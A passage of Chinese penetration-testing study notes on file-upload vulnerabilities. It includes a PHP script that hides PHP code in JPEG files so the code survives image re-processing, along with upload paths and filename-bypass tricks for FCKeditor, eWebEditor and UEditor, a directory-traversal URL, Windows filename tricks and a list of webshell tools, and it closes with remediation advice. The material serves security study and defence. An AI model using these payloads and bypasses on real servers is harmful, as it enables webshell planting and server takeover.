class="token-line" style="color:#393A34"><span class="token plain">                    $outStream = $outStreamTmp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                } else {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    break;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    die(&#x27;Success!&#x27;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                } else {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    break;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    unlink(&#x27;payload_&#x27;.$argv[1]);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    die(&#x27;Something\&#x27;s wrong&#x27;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    function checkImage($filename, $data, $unlink = FALSE) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        global $correctImage;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        file_put_contents($filename, $data);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $correctImage = TRUE;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        imagecreatefromjpeg($filename);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if($unlink)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            unlink($filename);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return $correctImage;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    function custom_error_handler($errno, $errstr, $errfile, $errline) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        global $extraBytes, $correctImage;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        $correctImage = FALSE;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if(preg_match(&#x27;/(\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if(isset($m[1])) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                $extraBytes = (int)$m[1];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    class DataInputStream {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        private $binData;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        private $order;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        private $size;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        public function __construct($filename, $order = false, $fromString = false) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            $this-&gt;binData = &#x27;&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            $this-&gt;order = $order;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if(!$fromString) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                if(!file_exists($filename) || !is_file($filename))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                $this-&gt;binData = file_get_contents($filename);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            } else {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                $this-&gt;binData = $filename;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            $this-&gt;size = strlen($this-&gt;binData);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        public function seek() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            return ($this-&gt;size - strlen($this-&gt;binData));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        public function skip($skip) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            $this-&gt;binData = substr($this-&gt;binData, $skip);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        public function readByte() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if($this-&gt;eof()) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                die(&#x27;End Of File&#x27;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            $byte = substr($this-&gt;binData, 0, 1);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            $this-&gt;binData = substr($this-&gt;binData, 1);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            return ord($byte);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        public function readShort() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if(strlen($this-&gt;binData) &lt; 2) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                die(&#x27;End Of File&#x27;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            $short = substr($this-&gt;binData, 0, 2);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            $this-&gt;binData = substr($this-&gt;binData, 2);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if($this-&gt;order) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            } else {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            return $short;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        public function eof() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">?&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">使用方法：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">找一个jpg图片,先上传至服务器然后再下载到本地保存为1.jpg.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">插入php代码</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">使用脚本处理1.jpg,命令php jpg_payload.php 1.jpg</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">使用16进制编辑器打开,就可以看到插入的php代码.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h5 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="编辑器漏洞">编辑器漏洞<a href="#编辑器漏洞" class="hash-link" aria-label="编辑器漏洞的直接链接" title="编辑器漏洞的直接链接">​</a></h5>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">常用编辑器：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">FCKeditor</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EWEbeditor</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CKFinder</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">UEDITOR</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DotNet TextBox</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Cute Editor</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><a href="https://wizardforcel.gitbooks.io/owasp-cheat-sheet-zh/content/editor-vulnerability-manual.html#fckeditor" target="_blank" rel="noopener noreferrer">编辑器漏洞手册 | 安全备忘单翻译项目</a></p>
<p>1.<code>Fckeditor</code>编辑器</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">常见上传目录：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">FCKeditor/editor/filemanager/browser/default/connectors/test.html</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">FCKeditor/editor/filemanager/upload/test.html</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">FCKeditor/editor/filemanager/connectors/test.html</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">FCKeditor/editor/filemanager/connectors/uploadtest.html</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>“.” 变 “_” 绕过方法
在高版本<code>fck</code>中，直接上传或抓包修改文件名<code>“shell.asp;.jpg”</code>，都会将前面的点变成下划线，也就是变成<code>“a_asp;.jpg”</code>。需要创建<code>1.asp</code>文件夹，然后在<code>1.asp</code>文件夹下上传图片马即可解析为<code>asp</code>文件。类似于前文的<code>iis</code>解析漏洞。</p>
<p>2.<code>eWebEditor</code>编辑器</p>
<p>1）后台（弱口令或者未授权）</p>
<p><code>eWeb</code>编辑器需要登录后台，其默认数据库地址是：<code>ewebeditor/db/ewebeditor.mdb</code>
2）<code>eweb</code>遍历漏洞</p>
<p>利用该漏洞遍历文件目录、查看整个网站结构及敏感信息</p>
<p><code>ewebeditor/admin_uploadfile.asp?id=14&amp;dir=./</code></p>
<p>3）修改样式
在图片类型中添加<code>.asa</code>后缀，编辑器会解析为<code>asp</code>文件
打开“工具栏”点击按钮设置，添加插入图片的按钮，保存，上传<code>asa</code>文件即可。</p>
<p>3.<code>Ueditor</code>编辑器</p>
<p>访问<code>http://ip:port/net/controller.ashx</code> 控制器文件。</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">返回该内容表示漏洞存在：</span><span class="token punctuation" style="color:#393A34">{</span><span class="token property" style="color:#36acaa">&quot;state&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token string" style="color:#e3116c">&quot;action 参数为空或者 action 不被支持。&quot;</span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>其余可直接上网查利用方式</p>
<h5 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="利用-windows-环境的叠加特征绕过">利用 windows 环境的叠加特征绕过<a href="#利用-windows-环境的叠加特征绕过" class="hash-link" aria-label="利用 windows 环境的叠加特征绕过的直接链接" title="利用 windows 环境的叠加特征绕过的直接链接">​</a></h5>
<p>在Windows操作系统中，文件系统有一定的规则来处理文件名。当一个文件以特定的方式命名时，比如 <code>phpinfo.php:.jpg</code>，Windows可能会截断或忽略文件名中某些特殊字符后面的部分。这是因为 <code>:</code> 在Windows中是一个用于表示卷标或驱动器的特殊字符，而在文件名中通常不被允许。当你尝试上传一个名为 <code>phpinfo.php:.jpg</code> 的文件时，Windows可能会将文件名截断为 <code>phpinfo.php</code>，因为 <code>:</code> 后面的部分被视为对文件系统的指令，而不是文件名的一部分。这样，就会在目录下创建一个名为 <code>phpinfo.php</code> 的空白文件</p>
<p>Windows的文件系统中，以下符号在正则匹配时可能被视为相等：</p>
<ul>
<li>双引号 <code>&quot;</code> 等于 点号 <code>.</code></li>
<li>大于符号 <code>&gt;</code> 等于 问号 <code>?</code></li>
<li>小于符号 <code>&lt;</code> 等于 星号 <code>*</code></li>
</ul>
<p><code>文件名.&lt;</code>、<code>文件名.&lt;&lt;&lt;</code>、<code>文件名.&gt;&gt;&gt;</code> 或 <code>文件名.&gt;&gt;&lt;空文件名</code> 时，这些是在尝试利用Windows文件系统的特性来创建特殊的文件名，这些文件名会在文件系统中被解释为不同的东西，或者导致文件名的一部分被忽略</p>
<h3 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="漏洞修复">漏洞修复<a href="#漏洞修复" class="hash-link" aria-label="漏洞修复的直接链接" title="漏洞修复的直接链接">​</a></h3>
<p>1.对文件上传类型进行验证，除了在前端验证外，在后端也要进行验证，在后端可以进行扩展名验证（设置白名单）、MIME类型检测；</p>
<p>2.重命名上传后的文件，或者直接uuid生成文件名，限制文件上传的大小，将上传的文件放在其他文件存储服务器中</p>
<p>3.严格限制和校验上传的文件内容，禁止上传存在恶意代码的文件，限制上传文件目录的执行权限，防止木马文件被执行</p>
<p>4.对上传文化格式进行校验，防止上传恶意脚本文件</p>
<p>5.严格限制上传文件的保存路径，隐藏上传文件路径不做回显</p>
<p>6.修复中间件漏洞，对其进行安全配置，或者使用版本相对较高的中间件，合理避开存在解析漏洞的版本</p>
<h3 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="webshell管理工具">webshell管理工具<a href="#webshell管理工具" class="hash-link" aria-label="webshell管理工具的直接链接" title="webshell管理工具的直接链接">​</a></h3>
<p>冰蝎（Behinder）、哥斯拉、蚁剑、中国菜刀</p>
<h3 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="参考文章">参考文章<a href="#参考文章" class="hash-link" aria-label="参考文章的直接链接" title="参考文章的直接链接">​</a></h3>
<p><a href="https://www.cnblogs.com/yokan/p/15252077.html" target="_blank" rel="noopener noreferrer">文件上传利用总结 - yokan - 博客园</a></p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/Penetration/Ⅱ.web漏洞/常见web框架漏洞/shiro/"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">shiro</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/Penetration/Ⅱ.web漏洞/文件包含/"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">文件包含</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#漏洞成因" class="table-of-contents__link toc-highlight">漏洞成因</a></li><li><a href="#绕过方式" class="table-of-contents__link toc-highlight">绕过方式</a></li><li><a href="#漏洞修复" class="table-of-contents__link toc-highlight">漏洞修复</a></li><li><a href="#webshell管理工具" class="table-of-contents__link toc-highlight">webshell管理工具</a></li><li><a href="#参考文章" class="table-of-contents__link toc-highlight">参考文章</a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">社交联系</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/blog">Blog</a></li><li class="footer__item"><a href="https://github.com/j1NsiLei/" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li class="footer__item"><a href="mailto:jsl_email@foxmail.com" target="_blank" rel="noopener noreferrer" class="footer__link-item">QQ邮箱<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div><div class="col footer__col"><div class="footer__title">笔记</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/docs/Penetration">渗透测试</a></li><li class="footer__item"><a class="footer__link-item" href="/docs/Response">应急响应</a></li><li class="footer__item"><a class="footer__link-item" href="/docs/Tools">工具合集</a></li></ul></div><div class="col footer__col"><div class="footer__title">更多</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://docusaurus.io/" target="_blank" rel="noopener noreferrer" class="footer__link-item">Docusaurus<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 jsl_blog | Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>